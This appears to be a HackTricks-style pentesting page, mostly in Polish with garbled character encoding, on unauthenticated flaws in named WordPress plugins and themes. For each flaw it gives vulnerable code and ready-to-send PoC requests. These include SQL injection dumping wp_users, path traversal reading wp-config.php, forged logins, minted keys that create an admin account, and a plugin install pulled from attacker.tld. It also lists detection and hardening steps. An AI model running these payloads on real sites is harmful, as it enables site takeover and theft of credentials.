### Eskalacja uprawnieÅ„ bez uwierzytelnienia przez przeÅ‚Ä…czanie uÅ¼ytkownika polegajÄ…ce na zaufaniu do cookie na publicznym hooku `init` (Service Finder â€œsf-bookingâ€)

NiektÃ³re pluginy podÅ‚Ä…czajÄ… pomocniki przeÅ‚Ä…czania uÅ¼ytkownika do publicznego hooka `init` i odczytujÄ… toÅ¼samoÅ›Ä‡ z cookie kontrolowanego przez klienta. JeÅ›li kod wywoÅ‚uje `wp_set_auth_cookie()` bez weryfikacji uwierzytelnienia, uprawnieÅ„ i waÅ¼nego nonce, dowolny niezalogowany odwiedzajÄ…cy moÅ¼e wymusiÄ‡ logowanie jako dowolny identyfikator uÅ¼ytkownika.

Typowy podatny wzorzec (uproszczony z Service Finder Bookings â‰¤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // ğŸ”¥ sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Dlaczego jest podatne

- Publiczny hook `init` sprawia, Å¼e handler jest dostÄ™pny dla niezalogowanych uÅ¼ytkownikÃ³w (brak zabezpieczenia `is_user_logged_in()`).
- ToÅ¼samoÅ›Ä‡ pochodzi z ciasteczka modyfikowalnego po stronie klienta (`original_user_id`).
- BezpoÅ›rednie wywoÅ‚anie `wp_set_auth_cookie($uid)` loguje osobÄ™ wysyÅ‚ajÄ…cÄ… Å¼Ä…danie jako tego uÅ¼ytkownika bez Å¼adnych sprawdzeÅ„ uprawnieÅ„ ani nonce.

Eksploatacja (bez uwierzytelnienia)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### RozwaÅ¼ania dotyczÄ…ce WAF dla WordPress/plugin CVEs

OgÃ³lne WAFy brzegowe/serwerowe sÄ… skonfigurowane pod kÄ…tem szerokich wzorcÃ³w (SQLi, XSS, LFI). Wiele wysokowpÅ‚ywowych luk WordPress/plugin to bÅ‚Ä™dy logiki/specyfiki aplikacji i autoryzacji, ktÃ³re wyglÄ…dajÄ… jak nieszkodliwy ruch, chyba Å¼e silnik rozumie trasy WordPress i semantykÄ™ pluginÃ³w.

Offensive notes

- Celuj w endpointy specyficzne dla pluginÃ³w z czystymi payloadami: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- SprawdÅº najpierw Å›cieÅ¼ki nieautoryzowane (AJAX `nopriv`, REST z permisywnym `permission_callback`, public shortcodes). DomyÅ›lne payloady czÄ™sto dziaÅ‚ajÄ… bez obfuskacji.
- Typowe przypadki o wysokim wpÅ‚ywie: eskalacja uprawnieÅ„ (zepsuta kontrola dostÄ™pu), dowolne przesyÅ‚anie/pobieranie plikÃ³w, LFI, open redirect.

Defensive notes

- Nie polegaj na ogÃ³lnych sygnaturach WAF w celu ochrony plugin CVEs. Zaimplementuj Å‚atki wirtualne specyficzne dla podatnoÅ›ci na warstwie aplikacji lub szybko aktualizuj.
- Preferuj podejÅ›cie pozytywnej polityki bezpieczeÅ„stwa w kodzie (capabilities, nonces, Å›cisÅ‚a walidacja wejÅ›cia) zamiast negatywnych filtrÃ³w regex.

## WordPress Protection

### Regular Updates

Upewnij siÄ™, Å¼e WordPress, pluginy i motywy sÄ… aktualne. PotwierdÅº takÅ¼e, Å¼e automatyczne aktualizacje sÄ… wÅ‚Ä…czone w wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Ponadto, **instaluj tylko zaufane wtyczki i motywy WordPress**.

### Wtyczki zabezpieczajÄ…ce

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Inne zalecenia**

- UsuÅ„ domyÅ›lnego uÅ¼ytkownika **admin**
- UÅ¼ywaj **silnych haseÅ‚** i **2FA**
- Okresowo **przeglÄ…daj** **uprawnienia** uÅ¼ytkownikÃ³w
- **Ogranicz liczbÄ™ prÃ³b logowania**, aby zapobiec atakom Brute Force
- ZmieÅ„ nazwÄ™ pliku **`wp-admin.php`** i zezwalaj na dostÄ™p tylko wewnÄ™trznie lub z okreÅ›lonych adresÃ³w IP.


### Unauthenticated SQL Injection via insufficient validation (WP Job Portal <= 2.3.2)

The WP Job Portal recruitment plugin exposed a **savecategory** task that ultimately executes the following vulnerable code inside `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Problemy wprowadzone przez ten fragment:

1. **Niesanitizowane dane wejÅ›ciowe uÅ¼ytkownika** â€“ `parentid` pochodzi bezpoÅ›rednio z Å¼Ä…dania HTTP.
2. **ÅÄ…czenie Å‚aÅ„cuchÃ³w znakÃ³w w klauzuli WHERE** â€“ brak `is_numeric()` / `esc_sql()` / prepared statement.
3. **DostÄ™p bez uwierzytelnienia** â€“ chociaÅ¼ akcja wykonywana jest przez `admin-post.php`, jedyna kontrola to **CSRF nonce** (`wp_verify_nonce()`), ktÃ³ry kaÅ¼dy odwiedzajÄ…cy moÅ¼e pobraÄ‡ ze strony publicznej osadzajÄ…cej shortcode `[wpjobportal_my_resumes]`.

#### Wykorzystanie

1. Pobierz Å›wieÅ¼y nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Wstrzyknij dowolne zapytanie SQL, wykorzystujÄ…c `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
OdpowiedÅº ujawnia wynik wstrzykniÄ™tego zapytania lub modyfikuje bazÄ™ danych, co potwierdza SQLi.


### Nieautoryzowane pobieranie dowolnych plikÃ³w / Path Traversal (WP Job Portal <= 2.3.2)

Inna akcja, **downloadcustomfile**, pozwalaÅ‚a odwiedzajÄ…cym pobraÄ‡ **dowolny plik z dysku** poprzez path traversal. WraÅ¼liwy punkt znajduje siÄ™ w `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` jest kontrolowany przez atakujÄ…cego i konkatenowany **bez filtrowania**.  Ponownie, jedynÄ… przeszkodÄ… jest **CSRF nonce**, ktÃ³ry moÅ¼na pobraÄ‡ ze strony CV.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Serwer zwraca zawartoÅ›Ä‡ `wp-config.php`, leaking DB credentials and auth keys.

## Unauthenticated account takeover via Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

Wiele motywÃ³w/wtyczek dostarcza helpery "social login" udostÄ™pnione przez admin-ajax.php. JeÅ›li nieuwierzytelniona akcja AJAX (wp_ajax_nopriv_...) ufa identyfikatorom przesÅ‚anym przez klienta, gdy brak danych providera, a nastÄ™pnie wywoÅ‚uje wp_set_auth_cookie(), to staje siÄ™ to peÅ‚nym obejÅ›ciem uwierzytelniania.

Typowy wadliwy wzorzec (uproszczony)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider â€“ execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // ğŸ”¥ logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
Dlaczego jest to podatne

- Unauthenticated reachability via admin-ajax.php (wp_ajax_nopriv_â€¦ action).
- Brak sprawdzeÅ„ nonce/capability przed zmianÄ… stanu.
- Brak weryfikacji OAuth/OpenID provider; gaÅ‚Ä…Åº domyÅ›lna akceptuje dane wejÅ›ciowe od attacker.
- get_user_by('email', $_POST['id']) followed by wp_set_auth_cookie($uid) powoduje uwierzytelnienie requestera jako dowolny istniejÄ…cy adres e-mail.

Wykorzystanie (unauthenticated)

- Wymagania wstÄ™pne: attacker moÅ¼e dotrzeÄ‡ do /wp-admin/admin-ajax.php i zna/zgaduje prawidÅ‚owy adres e-mail uÅ¼ytkownika.
- Ustaw provider na nieobsÅ‚ugiwanÄ… wartoÅ›Ä‡ (lub pomiÅ„ go), by trafiÄ‡ do gaÅ‚Ä™zi domyÅ›lnej i przekazaÄ‡ id=<victim_email>.
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Oczekiwane wskaÅºniki powodzenia

- HTTP 200 with JSON body like {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* dla zaatakowanego uÅ¼ytkownika; kolejne Å¼Ä…dania sÄ… uwierzytelnione.

Znajdowanie nazwy akcji

- Przeanalizuj motyw/plugin pod kÄ…tem rejestracji add_action('wp_ajax_nopriv_...', '...') w kodzie social login (np. framework/add-ons/social-login/class-social-login.php).
- Przeszukaj (grep) wystÄ…pienia wp_set_auth_cookie(), get_user_by('email', ...) w handlerach AJAX.

Lista kontrolna wykrywania

- Logi webowe pokazujÄ…ce nieautoryzowane POSTy do /wp-admin/admin-ajax.php z akcjÄ… social-login i id=<email>.
- Odpowiedzi 200 z JSONem powodzenia bezpoÅ›rednio poprzedzajÄ…ce uwierzytelniony ruch z tego samego IP/User-Agent.

Wzmocnienie zabezpieczeÅ„

- Nie wyprowadzaj toÅ¼samoÅ›ci z danych od klienta. Akceptuj tylko adresy e-mail/ID pochodzÄ…ce z zweryfikowanego provider token/ID.
- Wymagaj CSRF nonces i sprawdzeÅ„ uprawnieÅ„ nawet dla helperÃ³w logowania; unikaj rejestrowania wp_ajax_nopriv_ chyba Å¼e absolutnie konieczne.
- Weryfikuj odpowiedzi OAuth/OIDC po stronie serwera; odrzucaj brakujÄ…cych/nieprawidÅ‚owych providerÃ³w (bez fallbacku do POST id).
- RozwaÅ¼ tymczasowe wyÅ‚Ä…czenie social login lub wirtualne zaÅ‚atanie na krawÄ™dzi (zablokowanie podatnej akcji) do czasu naprawy.

Zachowanie po Å‚acie (Jobmonster 4.8.0)

- UsuniÄ™to niebezpieczny fallback z $_POST['id']; $user_email musi pochodziÄ‡ z zweryfikowanych gaÅ‚Ä™zi provider w switch($_POST['using']).

## Nieautoryzowana eskalacja uprawnieÅ„ przez wydawanie REST token/key na przewidywalnej toÅ¼samoÅ›ci (OttoKit/SureTriggers â‰¤ 1.0.82)

NiektÃ³re wtyczki udostÄ™pniajÄ… REST endpoints, ktÃ³re wydajÄ… wielokrotnego uÅ¼ytku â€œconnection keysâ€ lub tokeny bez weryfikacji uprawnieÅ„ wywoÅ‚ujÄ…cego. JeÅ›li route uwierzytelnia siÄ™ jedynie na podstawie Å‚atwego do odgadniÄ™cia atrybutu (np. username) i nie powiÄ…zuje klucza z uÅ¼ytkownikiem/sesjÄ… poprzez sprawdzenia uprawnieÅ„, dowolny nieautoryzowany atakujÄ…cy moÅ¼e wygenerowaÄ‡ klucz i wywoÅ‚aÄ‡ uprzywilejowane akcje (utworzenie konta admin, akcje wtyczki â†’ RCE).

- Podatna Å›cieÅ¼ka (przykÅ‚ad): sure-triggers/v1/connection/create-wp-connection
- BÅ‚Ä…d: akceptuje username, wydaje connection key bez current_user_can() lub rygorystycznej permission_callback
- WpÅ‚yw: peÅ‚ne przejÄ™cie poprzez powiÄ…zanie wygenerowanego klucza z wewnÄ™trznymi uprzywilejowanymi akcjami

PoC â€“ wygeneruj connection key i uÅ¼yj go
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# â†’ {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
Dlaczego to jest podatne
- WraÅ¼liwa REST route chroniona wyÅ‚Ä…cznie niskÄ… entropiÄ… potwierdzenia toÅ¼samoÅ›ci (username) lub brakiem permission_callback
- Brak egzekwowania capability; wygenerowany klucz jest akceptowany jako uniwersalne obejÅ›cie

Lista kontrolna wykrywania
- Przeszukaj kod pluginu pod kÄ…tem register_rest_route(..., [ 'permission_callback' => '__return_true' ])
- KaÅ¼da route, ktÃ³ra wydaje tokens/keys na podstawie toÅ¼samoÅ›ci podanej w Å¼Ä…daniu (username/email) bez powiÄ…zania z uwierzytelnionym uÅ¼ytkownikiem lub capability
- Szukaj kolejnych route, ktÃ³re akceptujÄ… wygenerowany token/key bez sprawdzeÅ„ capability po stronie serwera

Wzmocnienie
- Dla kaÅ¼dej uprzywilejowanej REST route: wymagaj permission_callback, ktÃ³ry wymusza current_user_can() dla wymaganej capability
- Nie generuj dÅ‚ugotrwaÅ‚ych kluczy na podstawie toÅ¼samoÅ›ci dostarczonej przez klienta; jeÅ›li konieczne, wydawaj krÃ³tkotrwaÅ‚e, powiÄ…zane z uÅ¼ytkownikiem tokeny po uwierzytelnieniu i ponownie sprawdzaj capability przy uÅ¼yciu
- Waliduj kontekst uÅ¼ytkownika wywoÅ‚ujÄ…cego (wp_set_current_user nie jest wystarczajÄ…ce samo w sobie) i odrzucaj Å¼Ä…dania, gdzie !is_user_logged_in() || !current_user_can(<cap>)

---

## Nonce gate misuse â†’ instalacja dowolnego pluginu bez uwierzytelnienia (FunnelKit Automations â‰¤ 3.5.3)

Nonces zapobiegajÄ… CSRF, nie autoryzacji. JeÅ›li kod traktuje pomyÅ›lne sprawdzenie nonce jako zielone Å›wiatÅ‚o i pomija sprawdzenia capability dla uprzywilejowanych operacji (np. install/activate plugins), nieuwierzytelnieni atakujÄ…cy mogÄ… speÅ‚niÄ‡ sÅ‚abe wymaganie nonce i osiÄ…gnÄ…Ä‡ RCE przez zainstalowanie backdoored lub vulnerable plugin.

- Vulnerable path: plugin/install_and_activate
- Flaw: weak nonce hash check; no current_user_can('install_plugins'|'activate_plugins') once nonce â€œpassesâ€
- Impact: full compromise via arbitrary plugin install/activation

PoC (shape depends on plugin; illustrative only)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
Lista kontrolna wykrywania
- REST/AJAX handlers that modify plugins/themes with only wp_verify_nonce()/check_admin_referer() and no capability check
- KaÅ¼da Å›cieÅ¼ka kodu, ktÃ³ra ustawia $skip_caps = true po walidacji nonce

Wzmocnienie
- Zawsze traktuj nonce jako tokeny CSRF tylko; wymuszaj sprawdzenia uprawnieÅ„ niezaleÅ¼nie od stanu nonce
- Wymagaj current_user_can('install_plugins') i current_user_can('activate_plugins') przed dotarciem do kodu instalatora
- Odrzucaj dostÄ™p bez uwierzytelnienia; unikaj ujawniania nopriv AJAX actions dla uprzywilejowanych przepÅ‚ywÃ³w

---

## SQLi bez uwierzytelnienia przez parametr s (search) w akcjach depicter-* (Depicter Slider â‰¤ 3.6.1)

Wiele akcji depicter-* pobieraÅ‚o parametr s (search) i konkatenowaÅ‚o go do zapytaÅ„ SQL bez parametryzacji.

- Parametr: s (search)
- BÅ‚Ä…d: bezpoÅ›rednie konkatenowanie Å‚aÅ„cuchÃ³w w klauzulach WHERE/LIKE; brak zapytaÅ„ przygotowanych i sanitizacji
- WpÅ‚yw: eksfiltracja bazy danych (uÅ¼ytkownicy, hashe), lateral movement

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Detection checklist
- Grepuj depicter-* action handlers oraz bezpoÅ›rednie uÅ¼ycie $_GET['s'] lub $_POST['s'] w zapytaniach SQL
- Przejrzyj niestandardowe zapytania przekazywane do $wpdb->get_results()/query() Å‚Ä…czÄ…ce parametr s

Hardening
- Zawsze uÅ¼ywaj $wpdb->prepare() lub wpdb placeholders; odrzucaj nieoczekiwane metaznaki po stronie serwera
- Dodaj Å›cisÅ‚Ä… allowlistÄ™ dla s i normalizuj do oczekiwanego charset/length

---

## Local File Inclusion bez uwierzytelnienia przez niezwalidowanÄ… Å›cieÅ¼kÄ™ szablonu/pliku (Kubio AI Page Builder â‰¤ 2.5.1)

Akceptowanie Å›cieÅ¼ek kontrolowanych przez atakujÄ…cego w parametrze szablonu bez normalizacji/ograniczenia pozwala na odczyt dowolnych lokalnych plikÃ³w, a czasem wykonanie kodu jeÅ›li includowalne pliki PHP/logi zostanÄ… zaÅ‚adowane do runtime.

- Parameter: __kubio-site-edit-iframe-classic-template
- Flaw: brak normalizacji/allowlisty; path traversal dozwolony
- Impact: ujawnienie sekretÃ³w (wp-config.php), potencjalne RCE w specyficznych Å›rodowiskach (log poisoning, includable PHP)

PoC â€“ odczyt wp-config.php
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
Lista kontrolna wykrywania
- KaÅ¼dy handler Å‚Ä…czÄ…cy Å›cieÅ¼ki Å¼Ä…daÅ„ w include()/require()/read sinks bez ograniczenia przez realpath()
- Szukaj wzorcÃ³w traversal (../) wychodzÄ…cych poza zamierzony katalog templates

Wzmocnienie
- Wymuszaj szablony z allowlisty; rozwiÄ…Å¼ Å›cieÅ¼ki za pomocÄ… realpath() i wymagaj str_starts_with(realpath(file), realpath(allowed_base))
- Normalizuj wejÅ›cie; odrzucaj sekwencje traversal i Å›cieÅ¼ki bezwzglÄ™dne; uÅ¼ywaj sanitize_file_name() tylko dla nazw plikÃ³w (nie peÅ‚nych Å›cieÅ¼ek)


## References

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset â€“ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments â‰¤ 5.6.1 â€“ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation â€“ Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025â€™s most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) â‰¤ 1.0.82 â€“ Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations â‰¤ 3.5.3 â€“ Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider â‰¤ 3.6.1 â€“ Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder â‰¤ 2.5.1 â€“ Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
